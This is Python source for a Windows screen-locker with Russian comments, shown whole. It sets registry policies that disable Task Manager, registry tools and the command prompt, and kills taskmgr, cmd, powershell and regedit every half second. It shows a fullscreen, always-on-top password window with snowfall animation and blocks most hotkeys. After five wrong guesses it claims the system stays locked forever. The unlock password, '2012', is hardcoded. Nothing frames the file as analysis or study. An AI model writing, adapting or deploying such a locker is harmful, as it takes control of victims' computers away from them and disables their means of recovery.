import tkinter as tk
import random
import os
import sys
import subprocess
import threading
import ctypes
import winreg

# === СИСТЕМНАЯ БЛОКИРОВКА ===

# Блокировка реестра
try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                        0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)
except:
    pass

# Блокировка CMD
try:
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                          "Software\\Policies\\Microsoft\\Windows\\System")
    winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 2)
    winreg.CloseKey(key)
except:
    pass

# Функция постоянной блокировки процессов
def block_processes():
    while True:
        try:
            subprocess.run(['taskkill', '/F', '/IM', 'taskmgr.exe'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['taskkill', '/F', '/IM', 'cmd.exe'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['taskkill', '/F', '/IM', 'powershell.exe'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['taskkill', '/F', '/IM', 'regedit.exe'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        threading.Event().wait(0.5)

# Запуск блокировки в отдельном потоке
threading.Thread(target=block_processes, daemon=True).start()

# === ИНТЕРФЕЙС БЛОКИРОВЩИКА ===

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.overrideredirect(True)

# Снежинки
canvas = tk.Canvas(root, bg='black', highlightthickness=0)
canvas.place(x=0, y=0, relwidth=1, relheight=1)

snowflakes = []
for _ in range(100):
    x = random.randint(0, root.winfo_screenwidth())
    y = random.randint(0, root.winfo_screenheight())
    flake = canvas.create_oval(x, y, x+5, y+5, fill='white', outline='cyan')
    snowflakes.append({'id': flake, 'x': x, 'y': y, 'dx': random.uniform(-0.5, 0.5)})

def animate_snow():
    for flake in snowflakes:
        canvas.move(flake['id'], flake['dx'], 1)
        flake['y'] += 1
        flake['x'] += flake['dx']
        if flake['y'] > root.winfo_screenheight():
            canvas.move(flake['id'], random.randint(0, root.winfo_screenwidth())-flake['x'], -root.winfo_screenheight())
            flake['y'] = 0
    root.after(20, animate_snow)

# Интерфейс ввода
frame = tk.Frame(root, bg='black')
frame.place(relx=0.5, rely=0.5, anchor='center')

label = tk.Label(frame, text="Система заблокирована\nВведите пароль!", 
                font=("Arial", 28, 'bold'), fg="red", bg='black', padx=30, pady=20)
label.pack()

entry = tk.Entry(frame, show="*", font=("Arial", 22), width=15, justify='center',
                bg='#222', fg='white', insertbackground='white', relief='flat')
entry.pack(pady=20, ipady=10)

# Счетчик попыток
attempts = 0
max_attempts = 5

# Функция РАЗБЛОКИРОВКИ
def unlock_system():
    # 1. ВОССТАНОВЛЕНИЕ РЕЕСТРА
    try:
        # Разблокировка диспетчера задач
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.DeleteValue(key, "DisableRegistryTools")
        winreg.CloseKey(key)
    except:
        pass
    
    try:
        # Разблокировка CMD
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            "Software\\Policies\\Microsoft\\Windows\\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableCMD")
        winreg.CloseKey(key)
    except:
        pass
    
    # 2. ВОССТАНОВЛЕНИЕ ПРОВОДНИКА
    try:
        subprocess.Popen(['explorer.exe'], shell=True)
    except:
        pass
    
    # 3. ЗАВЕРШЕНИЕ БЛОКИРОВЩИКА
    root.quit()
    root.destroy()
    os._exit(0)

def check_password():
    global attempts
    
    if entry.get() == "2012":
        # Правильный пароль
        label.config(text="✓ Система разблокируется...", fg="green")
        entry.config(state='disabled')
        button.config(state='disabled')
        root.after(1000, unlock_system)
    else:
        # Неправильный пароль
        attempts += 1
        remaining = max_attempts - attempts
        
        if remaining > 0:
            label.config(text=f"✗ Неверный пароль!\nОсталось попыток: {remaining}", fg="orange")
            entry.delete(0, 'end')
            entry.config(bg='#552222')
            # Возврат цвета через 0.5 секунды
            root.after(500, lambda: entry.config(bg='#222'))
        else:
            # Превышено количество попыток
            label.config(text="✗ Превышено количество попыток!\nСистема останется заблокированной", fg="red")
            entry.config(state='disabled', bg='#330000')
            button.config(state='disabled')
            
            # Активация усиленной блокировки
            def enhanced_lock():
                # Дополнительные меры блокировки
                try:
                    # Блокировка мыши
                    pass
                except:
                    pass
                
                # Периодическое изменение сообщения
                messages = [
                    "Система заблокирована навсегда",
                    "Доступ невозможен",
                    "Все попытки исчерпаны",
                    "Восстановление невозможно"
                ]
                import itertools
                message_cycle = itertools.cycle(messages)
                
                def change_message():
                    label.config(text=next(message_cycle), fg="red")
                    root.after(3000, change_message)
                
                change_message()
            
            root.after(1000, enhanced_lock)

button = tk.Button(frame, text="Разблокировать", command=check_password,
                  font=("Arial", 18, 'bold'), bg='#333', fg='white',
                  activebackground='#444', activeforeground='white',
                  relief='flat', padx=40, pady=15)
button.pack(pady=20)

# Обработка Enter
def on_enter(event):
    check_password()
entry.bind('<Return>', on_enter)

# Блокировка клавиш
def block_keys(event):
    blocked_keys = ['F4', 'Alt_L', 'Alt_R', 'Escape', 'Win_L', 'Win_R',
                   'Tab', 'Control_L', 'Control_R', 'F1', 'F2', 'F3',
                   'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12']
    if event.keysym in blocked_keys:
        return "break"
    
    # Блокировка Alt+Tab, Ctrl+Alt+Del и других комбинаций
    if event.state in [8, 9, 12, 13, 131072, 131073, 131076, 131077]:
        return "break"

root.bind_all('<Key>', block_keys)

# Запуск
animate_snow()
entry.focus_set()
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.mainloop()